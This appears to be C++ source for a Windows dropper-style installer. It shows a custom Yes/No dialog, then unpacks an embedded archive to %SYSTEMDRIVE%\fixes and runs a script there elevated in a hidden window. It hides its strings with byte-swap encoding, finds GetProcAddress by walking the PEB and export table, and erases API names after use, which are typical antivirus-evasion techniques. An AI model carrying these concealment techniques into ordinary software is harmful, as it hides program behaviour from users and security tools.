#include <io.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <windows.h>
#include <windowsx.h>
#include <winternl.h>
#include <direct.h>

#include "data.h"
#include "image.h"
#include "swap.h"

template <char c> struct enc_c{ enum{ v=(char)((swapbytes[(uint8_t)c])) }; };
#define ec(c)  enc_c<c>::v
#define e1(s)  ec(s[0])        ,F_1
#define e2(s)  e1(s) ,ec( s[1]),F_2
#define e3(s)  e2(s) ,ec( s[2]),F_3
#define e4(s)  e3(s) ,ec( s[3]),F_4
#define e5(s)  e4(s) ,ec( s[4]),F_5
#define e6(s)  e5(s) ,ec( s[5]),F_6
#define e7(s)  e6(s) ,ec( s[6]),F_7
#define e8(s)  e7(s) ,ec( s[7]),F_8
#define e9(s)  e8(s) ,ec( s[8]),F_9
#define e10(s) e9(s) ,ec( s[9]),F_10
#define e11(s) e10(s),ec(s[10]),F_11
#define e12(s) e11(s),ec(s[11]),F_12
#define e13(s) e12(s),ec(s[12]),F_13
#define e14(s) e13(s),ec(s[13]),F_14
#define e15(s) e14(s),ec(s[14]),F_15
#define e16(s) e15(s),ec(s[15]),F_16
#define e17(s) e16(s),ec(s[16]),F_17
#define e18(s) e17(s),ec(s[17]),F_18
#define e19(s) e18(s),ec(s[18]),F_19
#define e20(s) e19(s),ec(s[19]),F_20
#define e21(s) e20(s),ec(s[20]),F_21
#define e22(s) e21(s),ec(s[21]),F_22
#define e23(s) e22(s),ec(s[22]),F_23
#define e24(s) e23(s),ec(s[23]),F_24
#define e25(s) e24(s),ec(s[24]),F_25
#define e26(s) e25(s),ec(s[25]),F_26
#define e27(s) e26(s),ec(s[26]),F_27
#define e28(s) e27(s),ec(s[27]),F_28
#define e29(s) e28(s),ec(s[28]),F_29
#define e30(s) e29(s),ec(s[29]),F_30
#define e31(s) e30(s),ec(s[30]),F_31
#define e32(s) e31(s),ec(s[31]),F_32
#define e33(s) e32(s),ec(s[32]),F_33
#define e34(s) e33(s),ec(s[33]),F_34
#define e35(s) e34(s),ec(s[34]),F_35
#define e36(s) e35(s),ec(s[35]),F_36
#define e37(s) e36(s),ec(s[36]),F_37
#define _(s,i) {e##i(s),ec(0)  ,F_0}
void __(const char *s,unsigned short l){
    for(uint8_t i=0;i<l*2+1;i+=2) ((char *)s)[i>>1]=valuebytes[(uint8_t)s[i]];
}
#define _s(n,s,l) const char n[]=_(s,l);__(n,l);

HINSTANCE hmsvcrt,huser32,hshell32,hgdi32,hkernel32;

typedef HMODULE (WINAPI *LLA)(LPCSTR);
LLA lla;
typedef BOOL (WINAPI *SEA)(SHELLEXECUTEINFOA*);
SEA sea;
typedef HBITMAP (WINAPI *CB)(int,int,UINT,UINT,const VOID*);
CB cbmp;
typedef HDC (WINAPI *CCDC)(HDC);
CCDC cdc;
typedef BOOL (WINAPI *DDC)(HDC);
DDC ddc;
typedef BOOL (WINAPI *DOB)(HGDIOBJ);
DOB dob;
typedef int (WINAPI *GOA)(HANDLE,int,LPVOID);
GOA goa;
typedef BOOL (WINAPI *BLT)(HDC,int,int,int,int,HDC,int,int,DWORD);
BLT blt;
typedef HGDIOBJ (WINAPI *SOB)(HDC,HGDIOBJ);
SOB sob;
typedef HPEN (WINAPI *CRP)(int,int,COLORREF);
CRP crp;
typedef BOOL (WINAPI *LTO)(HDC,int,int);
LTO lto;
typedef BOOL (WINAPI *MTE)(HDC,int,int,LPPOINT);
MTE mte;
typedef BOOL (WINAPI *AWR)(LPRECT,DWORD,BOOL);
AWR awr;
typedef HDC (WINAPI *BEP)(HWND,LPPAINTSTRUCT);
BEP bep;
typedef HWND (WINAPI *CWEA)(DWORD,LPCSTR,LPCSTR,DWORD,int,int,int,int,HWND,HMENU,HINSTANCE,LPVOID);
CWEA cwea;
typedef LRESULT (WINAPI *DWPA)(HWND,UINT,WPARAM,LPARAM);
DWPA dwpa;
typedef BOOL (WINAPI *DWI)(HWND);
DWI dwi;
typedef LRESULT (WINAPI *DMA)(const MSG *);
DMA dma;
typedef BOOL (WINAPI *EPA)(HWND,const PAINTSTRUCT *);
EPA epa;
typedef BOOL (WINAPI *GCR)(HWND,LPRECT);
GCR gcr;
typedef HDC (WINAPI *GDC)(HWND);
GDC gdc;
typedef BOOL (WINAPI *GMA)(LPMSG,HWND,UINT,UINT);
GMA gma;
typedef int (WINAPI *GSM)(int);
GSM gsm;
typedef BOOL (WINAPI *IVR)(HWND,const RECT *,BOOL);
IVR ivr;
typedef HCURSOR (WINAPI *LCA)(HINSTANCE,LPCSTR);
LCA lca;
typedef HICON (WINAPI *LIA)(HINSTANCE,LPCSTR);
LIA lia;
typedef void (WINAPI *PQM)(int);
PQM pqm;
typedef BOOL (WINAPI *PIR)(const RECT *,POINT);
PIR pir;
typedef ATOM (WINAPI *RCA)(const WNDCLASSA *);
RCA rca;
typedef BOOL (WINAPI *RCP)();
RCP rcp;
typedef int (WINAPI *RDC)(HWND,HDC);
RDC rdc;
typedef LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM);
SMA sma;
typedef BOOL (WINAPI *SWW)(HWND,int);
SWW sww;
typedef BOOL (WINAPI *TMV)(LPTRACKMOUSEEVENT);
TMV tmv;
typedef BOOL (WINAPI *TMS)(const MSG *);
TMS tms;
typedef BOOL (WINAPI *UCA)(LPCSTR,HINSTANCE);
UCA uca;
typedef BOOL (WINAPI *UWI)(HWND);
UWI uwi;
typedef BOOL (WINAPI *FLIB)(HMODULE);
FLIB flib;
typedef ULONGLONG (WINAPI *VSCM)(ULONGLONG,DWORD,BYTE);
VSCM vscm;
typedef BOOL (WINAPI *VVIA)(LPOSVERSIONINFOEXA,DWORD,DWORDLONG);
VVIA vvia;
typedef FARPROC (WINAPI *GPA)(HMODULE,LPCSTR);
GPA gpa;

typedef int (__cdecl *_access_t)(const char *,int);
_access_t _access_p;
typedef int (__cdecl *_mkdir_t)(const char *);
_mkdir_t _mkdir_p;
typedef int (__cdecl *fclose_t)(FILE *);
fclose_t fclose_p;
typedef errno_t (__cdecl *fopen_s_t)(FILE**,const char *,const char *);
fopen_s_t fopen_s_p;
typedef int (__cdecl *fputc_t)(int,FILE *);
fputc_t fputc_p;
typedef char *(__cdecl *getenv_t)(const char *);
getenv_t getenv_p;
typedef int (__cdecl *sprintf_t)(char *,const char * ... );
sprintf_t sprintf_p;
typedef size_t (__cdecl *strlen_t)(const char *);
strlen_t strlen_p;
typedef void (__cdecl *free_t)(void *);
free_t free_p;
typedef void *(__cdecl *calloc_t)(size_t,size_t);
calloc_t calloc_p;

template <typename T> void get_fn_ptr(T* &p,HINSTANCE l,const char *f){
  if(l){
    p=(T*)gpa(l,f);
    if(!p) exit(1);
    char *c=(char *)f;
    while(*c) *c++=0;
    return;
  };
  exit(1);
};

HBITMAP hBitmap,hOldBitmap;
HDC hdc,hdcMem;
BITMAP bm;
HINSTANCE hI;
PAINTSTRUCT ps;
RECT rect,rc,rc_yes,rc_no;
HPEN hpen;
POINT mpos;
BOOL mousetrack=FALSE,mark_yes=FALSE,mark_no=FALSE;
TRACKMOUSEEVENT tme;
int dlg_ret=0;
bool inv=false;
uint8_t *image;

LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
  switch(msg){
    case WM_CREATE:
      hBitmap=cbmp(506,191,1,32,image);
      goa(hBitmap,sizeof(BITMAP),&bm);
      hdc=gdc(hWnd);
      hdcMem=cdc(hdc);
      hOldBitmap=(HBITMAP)sob(hdcMem,hBitmap);
      hpen=crp(PS_SOLID,8,RGB(39,39,39));
      rdc(hWnd,hdc);
      return 0;
    case WM_KEYDOWN:
      if(wParam==VK_ESCAPE||wParam=='N'||wParam=='n'){
        dwi(hWnd);
        return 0;
      }
      else{
        if(wParam=='Y'||wParam=='y'){
          dlg_ret=1;
          dwi(hWnd);
          return 0;
        };
      };
      break;
    case WM_LBUTTONDOWN:
      rcp();
      sma(hWnd,0xA1,2,0);
      mpos.x=LOWORD(lParam);
      mpos.y=HIWORD(lParam);
      if(pir(&rc_yes,mpos)){
        dlg_ret=1;
        dwi(hWnd);
        return 0;
      };
      if(pir(&rc_no,mpos)){
        dwi(hWnd);
        return 0;
      };
      break;
    case WM_MOUSEMOVE:
      if(!mousetrack) mousetrack=tmv(&tme);
      break;
    case WM_MOUSELEAVE:
      mousetrack=FALSE;
      if(mark_yes||mark_no) inv=true;
      mark_yes=FALSE;
      mark_no=FALSE;
      if(inv){
        ivr(hWnd,NULL,FALSE);
        uwi(hWnd);
        inv=false;
      };
      break;
    case WM_MOUSEHOVER:
      mousetrack=FALSE;
      mpos.x=LOWORD(lParam);
      mpos.y=HIWORD(lParam);
      inv=false;
      if(pir(&rc_yes,mpos)){
        if(!mark_yes){
          mark_yes=TRUE;
          inv=true;
        };
        if(mark_no){
          mark_no=FALSE;
          inv=true;
        };
      }
      else{
        if(pir(&rc_no,mpos)){
          if(!mark_no){
            mark_no=TRUE;
            inv=true;
          };
          if(mark_yes){
            mark_yes=FALSE;
            inv=true;
          };
        }
        else{
          if(mark_yes||mark_no) inv=true;
          mark_no=FALSE;
          mark_yes=FALSE;
        };
      };
      if(inv){
        ivr(hWnd,NULL,FALSE);
        uwi(hWnd);
      };
      break;
    case WM_PAINT:
      hdc=bep(hWnd,&ps);
      gcr(hWnd,&rect);
      blt(hdc,0,0,rect.right,rect.bottom,hdcMem,0,0,SRCCOPY);
      if(mark_yes){
        sob(hdc,hpen);
        mte(hdc,33,118,NULL);
        lto(hdc,53,138);
        lto(hdc,33,158);
        mte(hdc,220,118,NULL);
        lto(hdc,200,138);
        lto(hdc,220,158);
      };
      if(mark_no){
        sob(hdc,hpen);
        mte(hdc,286,118,NULL);
        lto(hdc,306,138);
        lto(hdc,286,158);
        mte(hdc,473,118,NULL);
        lto(hdc,453,138);
        lto(hdc,473,158);
      };
      epa(hWnd,&ps);
      break;
    case WM_DESTROY:
      pqm(0);
      ddc(hdcMem);
      dob(hBitmap);
      dob(hOldBitmap);
      break;
  }
  return dwpa(hWnd,msg,wParam,lParam);
}

int dlg_window(HINSTANCE hInstance){
  hI=hInstance;
  WNDCLASS wc;
  wc.style=CS_DROPSHADOW;
  wc.lpfnWndProc=dlg_wndproc;
  wc.hInstance=hInstance;
  wc.hIcon=lia(NULL,IDI_APPLICATION);
  wc.hCursor=lca(NULL,IDC_ARROW);
  wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
  _s(idc,"imgdlgclass",11);
  wc.lpszClassName=idc;
  wc.lpszMenuName=NULL;
  wc.cbClsExtra=0;
  wc.cbWndExtra=0;
  rca(&wc);
  rc={0,0,506,191};
  rc_yes={19,104,234,175};
  rc_no={272,104,487,175};
  awr(&rc,WS_CAPTION|WS_SYSMENU, FALSE);
  int nWidth=rc.right-rc.left;
  int nHeight=rc.bottom-rc.top;
  int nX=(gsm(SM_CXSCREEN)-nWidth)/2;
  int nY=(gsm(SM_CYSCREEN)-nHeight)/2;
  if(nX<0) nX=0;
  if(nY<0) nY=0;
  tme.cbSize=sizeof(tme);
  tme.dwFlags=TME_HOVER|TME_LEAVE;
  tme.dwHoverTime=10;
  HWND hWnd=cwea(WS_EX_COMPOSITED|WS_EX_TOOLWINDOW|WS_EX_TOPMOST,wc.lpszClassName,NULL,WS_CAPTION|WS_SYSMENU,nX,nY,nWidth,nHeight,NULL,NULL,hInstance,NULL);
  tme.hwndTrack=hWnd;
  sww(hWnd,SW_SHOW);
  uwi(hWnd);
  MSG msg;
  while(gma(&msg,NULL,0,0)){
    dma(&msg);
    tms(&msg);
  };
  uca(wc.lpszClassName, hInstance);
  return 0;
}

UINT null_msg;;

LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
  switch(msg){
    case WM_CREATE:
      SendMessageA(hWnd,null_msg,0,0);
      return 0;
    case WM_CLOSE:
    case WM_DESTROY:
    case WM_ENDSESSION:
      PostQuitMessage(0);
      break;
    default:
      if(msg==null_msg){
        dlg_window(0);
        PostQuitMessage(0);
      };
      break;
  }
  return DefWindowProcA(hWnd,msg,wParam,lParam);
};

void null_window(HINSTANCE hInstance){
  SetLastError(0);
  MSG msg;
  WNDCLASS wc;
  HWND hwnd;
  wc.style=wc.cbClsExtra=wc.cbWndExtra=0;
  wc.lpfnWndProc=null_wndproc;
  wc.hInstance=hInstance;
  wc.hIcon=wc.hCursor=NULL;
  wc.hbrBackground=NULL;
  wc.lpszMenuName=NULL;
  wc.lpszClassName="main";
  null_msg=RegisterWindowMessageA(wc.lpszClassName);
  if(!RegisterClass(&wc)) return;
  hwnd=CreateWindow(wc.lpszClassName,NULL,0,0,0,0,0,0,0,hInstance,0);
  if(!hwnd){
     UnregisterClass(wc.lpszClassName,hInstance);
     return;
  };
  while(GetMessage(&msg,NULL,0,0)>0){
    DispatchMessage(&msg);
  };
  UnregisterClass(wc.lpszClassName,hInstance);
  return;
};

#define LZ_BUF_SIZE 259
#define LZ_CAPACITY 24
#define LZ_MIN_MATCH 3

uint8_t flags;
uint8_t cbuffer[LZ_CAPACITY+1];
uint8_t vocbuf[0x10000];
uint32_t frequency[257];
uint16_t buf_size;
uint16_t vocroot;
uint16_t offset;
uint16_t lenght;
uint16_t symbol;
uint32_t low;
uint32_t hlp;
uint32_t range;
uint32_t *fc;
char *lowp;
char *hlpp;
uint8_t *cpos;
uint8_t rle_flag;

uint32_t dptr;
uint32_t dsize;
uint8_t *pdata;

uint8_t dgetc(){
  uint8_t s=0;
  if(dptr<dsize){
    s=pdata[dptr];
    dptr++;
  };
  return s;
}

uint8_t rc32_getc(uint8_t *c){
  while((range<0x10000)||(hlp<low)){
    if(((low&0xff0000)==0xff0000)&&(range+(uint16_t)low>=0x10000))
      range=0x10000-(uint16_t)low;
    hlp<<=8;
    *hlpp=dgetc();
    if(dptr==dsize) return 0;
    low<<=8;
    range<<=8;
  };
  range/=*fc;
  uint32_t count=(hlp-low)/range;
  if(count>=*fc) return 1;
  symbol=0;
  uint16_t i,j=128;
  while(j){
    if(frequency[symbol]<=count) symbol+=j;
    else{
      if(symbol) symbol-=j;
      else break;
    };
    j>>=1;
  };
  if(frequency[symbol]>count&&symbol) symbol--;
  *c=(uint8_t)symbol;
  j=frequency[symbol++];
  low+=j*range;
  range*=frequency[symbol]-j;
  for(i=symbol;i<257;i++) frequency[i]++;
  if(*fc>0xffff){
    uint32_t *fp=frequency;
    frequency[0]>>=1;
    for(i=1;i<257;i++){
      if((frequency[i]>>=1)==*fp++) frequency[i]++;
    };
  };
  return 0;
}

uint8_t unpack_file(){
  uint16_t i;
  if(lenght){
    if(!rle_flag){
      symbol=vocbuf[offset++];
      vocbuf[vocroot++]=symbol;
    };
    lenght--;
  }
  else{
    if(flags==0){
      cpos=cbuffer;
      if(rc32_getc(cpos++)) return 1;
      flags=8;
      lenght=0;
      symbol=*cbuffer;
      for(i=0;i<flags;i++){
        if(symbol&0x80) lenght++;
        else lenght+=3;
        symbol<<=1;
      };
      for(i=lenght;i;i--)
        if(rc32_getc(cpos++)) return 1;
      cpos=cbuffer+1;
    };
    lenght=0;
    if(*cbuffer&0x80){
      symbol=*cpos;
      vocbuf[vocroot++]=*cpos;
    }
    else{
      lenght=*cpos+++LZ_MIN_MATCH+1;
      offset=*(uint16_t*)cpos++;
      if(offset==0x0100) return 1;
      if(offset<0x0100){
        rle_flag=1;
        symbol=offset;
        for(i=0;i<lenght;i++) vocbuf[vocroot++]=symbol;
        lenght--;
      }
      else{
        rle_flag=0;
        offset=0xffff+(uint16_t)(vocroot+LZ_BUF_SIZE)-offset;
        symbol=vocbuf[offset++];
        vocbuf[vocroot++]=symbol;
        lenght--;
      };
    };
    *cbuffer<<=1;
    cpos++;
    flags--;
  };
  return 0;
}

void rmkdir(char *path,int depth){
  for(uint16_t i=depth;i<strlen_p(path);i++){
    if(path[i]=='/'){
      path[i]=0;
      if(_access_p(path,0)!=0){
        _mkdir_p(path);
        if(_access_p(path,0)!=0) return;
      };
      path[i]='/';
      depth=i+1;
      rmkdir(path,depth);
      break;
    };
  };
  return;
}

uint8_t read_packed_value(void *p,uint16_t s){
  for(uint16_t i=0;i<s;i++){
    if(unpack_file()) return 1;
    ((char *)p)[i]=(char)symbol;
  };
  return 0;
}

void init_unpack(const uint8_t *data_ptr,const uint32_t data_size_in){
  pdata=(uint8_t *)data_ptr;
  dsize=data_size_in;
  dptr=buf_size=flags=vocroot=low=hlp=lenght=rle_flag=0;
  offset=range=0xffffffff;
  lowp=&((char *)&low)[3];
  hlpp=&((char *)&hlp)[0];
  fc=&frequency[256];
  uint32_t i;
  for(i=0;i<257;i++) frequency[i]=i;
  for(i=0;i<0x10000;i++) vocbuf[i]=0xff;
  for(i=0;i<sizeof(uint32_t);i++){
    hlp<<=8;
    *hlpp=dgetc();
  }
};

void unarc(char *out){
  FILE *o;
  uint32_t fl=0,i;
  char *t=(char *)&fl,fp[257];
  init_unpack(data,data_size);
  for(;;){
    if(read_packed_value(t,sizeof(uint32_t))) break;
    if(dptr==dsize) break;
    for(i=0;i<strlen_p(out);i++) fp[i]=out[i];
    fp[i]='/';
    if(read_packed_value(&fp[strlen_p(out)+1],fl)) break;
    if(dptr==dsize) break;
    fp[fl+strlen_p(out)+1]=0;
    if(read_packed_value(t,sizeof(uint32_t))) break;
    if(dptr==dsize) break;
    rmkdir(fp,0);
    fopen_s_p(&o,fp,"wb");
    if(o){
      for(i=0;i<fl;i++){
        if(unpack_file()) return;
        fputc_p((char)symbol,o);
      };
      fclose_p(o);
    };
  };
}

bool iswin10(){
  OSVERSIONINFOEXA osvi={sizeof(osvi),0,0,0,0,{0},0,0};
  DWORDLONG const dwlConditionMask=vscm(
    vscm(vscm(0,VER_MAJORVERSION,VER_GREATER_EQUAL),VER_MINORVERSION, VER_GREATER_EQUAL),VER_SERVICEPACKMAJOR,VER_GREATER_EQUAL);
  osvi.dwMajorVersion=HIBYTE(_WIN32_WINNT_WINTHRESHOLD);
  osvi.dwMinorVersion=LOBYTE(_WIN32_WINNT_WINTHRESHOLD);
  osvi.wServicePackMajor=0;
  return vvia(&osvi,VER_MAJORVERSION|VER_MINORVERSION|VER_SERVICEPACKMAJOR,dwlConditionMask)!=FALSE;
};

void gpa_kernel(){
  __asm__ volatile(
    "xor (%0),      %0\n\t"
    "mov %%fs:0x30, %0\n\t"
    "mov 0x0C(%0),  %0\n\t"
    "mov 0x14(%0),  %0\n\t"
    "mov (%0),      %0\n\t"
    "mov (%0),      %0\n\t"
    "mov 0x10(%0),  %0\n\t"
    : "=r"(hkernel32));
  ULONG_PTR moduleBase;
  PIMAGE_DOS_HEADER dosHeader;
  PIMAGE_NT_HEADERS ntHeaders;
  PIMAGE_EXPORT_DIRECTORY eatDirectory;
  DWORD* eatFunctions;
  WORD* eatOrdinals;
  DWORD* eatNames;
  DWORD eatNameOffset;
	moduleBase=(ULONG_PTR)hkernel32;
  dosHeader=(PIMAGE_DOS_HEADER)moduleBase;
	ntHeaders=(PIMAGE_NT_HEADERS)(moduleBase+dosHeader->e_lfanew);
	eatDirectory=(PIMAGE_EXPORT_DIRECTORY)(moduleBase+ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
  eatFunctions=(DWORD*)(moduleBase+eatDirectory->AddressOfFunctions);
  eatOrdinals=(WORD*)(moduleBase+eatDirectory->AddressOfNameOrdinals);
  eatNames=(DWORD*)(moduleBase+eatDirectory->AddressOfNames);
  _s(kern_gpa,"GetProcAddress",14);
  for(uint32_t i=0;i<eatDirectory->NumberOfNames;i++){
    eatNameOffset=eatNames[i];
    char *src=(char*)(moduleBase+eatNameOffset);
    char *dst=(char*)kern_gpa;
    while(*src && *dst){
      if(*src!=*dst) break;
      src++;
      dst++;
    };
    if(*src==0 && *dst==0) gpa=(GPA)(moduleBase+eatFunctions[eatOrdinals[i]]);
  };
  char *c=(char *)kern_gpa;
  while(*c) *c++=0;
};

void init(){
  gpa_kernel();
  _s(dll_u,"User32",6);
  _s(dll_m,"msvcrt",6);
  _s(dll_s,"Shell32",7);
  _s(dll_g,"Gdi32",5);
  _s(f0000,"_access",7);
  _s(f0001,"_mkdir",6);
  _s(f0002,"fclose",6);
  _s(f0003,"fopen_s",7);
  _s(f0004,"fputc",5);
  _s(f0005,"getenv",6);
  _s(f0006,"sprintf",7);
  _s(f0007,"strlen",6);
  _s(f0008,"free",4);
  _s(f0009,"calloc",6);
  _s(f0010,"CreateBitmap",12);
  _s(f0011,"CreateCompatibleDC",18);
  _s(f0012,"DeleteDC",8);
  _s(f0013,"DeleteObject",12);
  _s(f0014,"GetObjectA",10);
  _s(f0015,"ShellExecuteExA",15);
  _s(f0016,"FreeLibrary",11);
  _s(f0017,"BitBlt",6);
  _s(f0018,"SelectObject",12);
  _s(f0019,"CreatePen",9);
  _s(f0020,"LineTo",6);
  _s(f0021,"MoveToEx",8);
  _s(f0022,"AdjustWindowRect",16);
  _s(f0023,"BeginPaint",10);
  _s(f0024,"CreateWindowExA",15);
  _s(f0025,"DefWindowProcA",14);
  _s(f0026,"DestroyWindow",13);
  _s(f0027,"DispatchMessageA",16);
  _s(f0028,"EndPaint",8);
  _s(f0029,"GetClientRect",13);
  _s(f0030,"GetDC",5);
  _s(f0031,"GetMessageA",11);
  _s(f0032,"GetSystemMetrics",16);
  _s(f0033,"InvalidateRect",14);
  _s(f0034,"LoadCursorA",11);
  _s(f0035,"LoadIconA",9);
  _s(f0036,"PostQuitMessage",15);
  _s(f0037,"PtInRect",8);
  _s(f0038,"RegisterClassA",14);
  _s(f0039,"ReleaseCapture",14);
  _s(f0040,"ReleaseDC",9);
  _s(f0041,"SendMessageA",12);
  _s(f0042,"ShowWindow",10);
  _s(f0043,"TrackMouseEvent",15);
  _s(f0044,"TranslateMessage",16);
  _s(f0045,"UnregisterClassA",16);
  _s(f0046,"UpdateWindow",12);
  _s(f0047,"LoadLibraryA",12);
  _s(f0048,"VerSetConditionMask",19);
  _s(f0049,"VerifyVersionInfoA",18);
  get_fn_ptr(flib,hkernel32,f0016);
  get_fn_ptr(lla,hkernel32,f0047);
  hmsvcrt=lla(dll_m);
  huser32=lla(dll_u);
  hgdi32=lla(dll_g);
  hshell32=lla(dll_s);
  get_fn_ptr(vscm,hkernel32,f0048);
  get_fn_ptr(vvia,hkernel32,f0049);
  get_fn_ptr(_access_p,hmsvcrt,f0000);
  get_fn_ptr(_mkdir_p,hmsvcrt,f0001);
  get_fn_ptr(fclose_p,hmsvcrt,f0002);
  get_fn_ptr(fopen_s_p,hmsvcrt,f0003);
  get_fn_ptr(fputc_p,hmsvcrt,f0004);
  get_fn_ptr(getenv_p,hmsvcrt,f0005);
  get_fn_ptr(sprintf_p,hmsvcrt,f0006);
  get_fn_ptr(strlen_p,hmsvcrt,f0007);
  get_fn_ptr(free_p,hmsvcrt,f0008);
  get_fn_ptr(calloc_p,hmsvcrt,f0009);
  get_fn_ptr(awr,huser32,f0022);
  get_fn_ptr(bep,huser32,f0023);
  get_fn_ptr(cwea,huser32,f0024);
  get_fn_ptr(dwpa,huser32,f0025);
  get_fn_ptr(dwi,huser32,f0026);
  get_fn_ptr(dma,huser32,f0027);
  get_fn_ptr(epa,huser32,f0028);
  get_fn_ptr(gcr,huser32,f0029);
  get_fn_ptr(gdc,huser32,f0030);
  get_fn_ptr(gma,huser32,f0031);
  get_fn_ptr(gsm,huser32,f0032);
  get_fn_ptr(ivr,huser32,f0033);
  get_fn_ptr(lca,huser32,f0034);
  get_fn_ptr(lia,huser32,f0035);
  get_fn_ptr(pqm,huser32,f0036);
  get_fn_ptr(pir,huser32,f0037);
  get_fn_ptr(rca,huser32,f0038);
  get_fn_ptr(rcp,huser32,f0039);
  get_fn_ptr(rdc,huser32,f0040);
  get_fn_ptr(sma,huser32,f0041);
  get_fn_ptr(sww,huser32,f0042);
  get_fn_ptr(tmv,huser32,f0043);
  get_fn_ptr(tms,huser32,f0044);
  get_fn_ptr(uca,huser32,f0045);
  get_fn_ptr(uwi,huser32,f0046);
  get_fn_ptr(cbmp,hgdi32,f0010);
  get_fn_ptr(cdc,hgdi32,f0011);
  get_fn_ptr(ddc,hgdi32,f0012);
  get_fn_ptr(dob,hgdi32,f0013);
  get_fn_ptr(goa,hgdi32,f0014);
  get_fn_ptr(blt,hgdi32,f0017);
  get_fn_ptr(sob,hgdi32,f0018);
  get_fn_ptr(crp,hgdi32,f0019);
  get_fn_ptr(lto,hgdi32,f0020);
  get_fn_ptr(mte,hgdi32,f0021);
  get_fn_ptr(sea,hshell32,f0015);
  if (!iswin10()) exit(0);
};

INT WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PSTR lpCmdLine,INT nCmdShow){
  init();
  image=(uint8_t*)calloc_p(image_size,1);
  if(image){
    init_unpack(packed_image,image_data_size);
    for(uint32_t i=0;i<image_size;i++){
      if(unpack_file()) break;
      image[i]=(uint8_t)symbol;
      if(dptr==dsize) break;
    };
    null_window(0);
    if(dlg_ret){
      _s(drv_e,"SYSTEMDRIVE",11);
      _s(mas_a,"%s/",3);
      _s(sea_m,"runas",5);
      _s(sea_c,"cmd.exe",7);
      _s(sea_o,"/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",30);
      _s(sea_r,"/c rd /s /q %SYSTEMDRIVE%\\fixes",31);
      char path[257];
      sprintf_p(path,mas_a,getenv_p(drv_e));
      unarc(path);
      SHELLEXECUTEINFO ShExecInfo;
      ShExecInfo.cbSize=sizeof(SHELLEXECUTEINFO);
      ShExecInfo.fMask=0;
      ShExecInfo.hwnd=NULL;
      ShExecInfo.lpVerb=sea_m;
      ShExecInfo.lpFile=sea_c;
      ShExecInfo.lpParameters=sea_o;
      ShExecInfo.lpDirectory=NULL;
      ShExecInfo.nShow=0;
      ShExecInfo.hInstApp=0;
      if(sea(&ShExecInfo)==FALSE){
        ShExecInfo.lpVerb=NULL;
        ShExecInfo.lpParameters=sea_r;
        sea(&ShExecInfo);
      };
    };
    free_p(image);
  };
  flib(hshell32);
  flib(hgdi32);
  flib(huser32);
  flib(hmsvcrt);
  return 0;
}
